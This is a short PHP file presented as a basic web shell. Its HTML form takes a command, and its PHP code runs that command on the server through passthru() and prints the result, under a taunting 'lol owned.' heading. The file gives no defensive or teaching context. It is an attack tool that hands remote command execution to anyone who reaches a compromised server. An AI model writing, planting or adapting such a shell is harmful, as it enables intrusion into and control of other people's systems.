<!-- basic php web shell -->

<html>
  <head>
    <title>PHP web shell</title>
  </head>
  <body>
  	<h3>lol owned.</h3><br><br>
  	<form action="" method="post">
  		command: <input type="text" size="75" name="command">
  		<input type="submit">
  	</form>

  	<?php
  	if(isset($command)) {
  		echo '<b>'. htmlentities($command). '</b><pre>';
  		passthru("$command");
  		echo '</pre>';
  	}
  	?>
  </body>
</html>
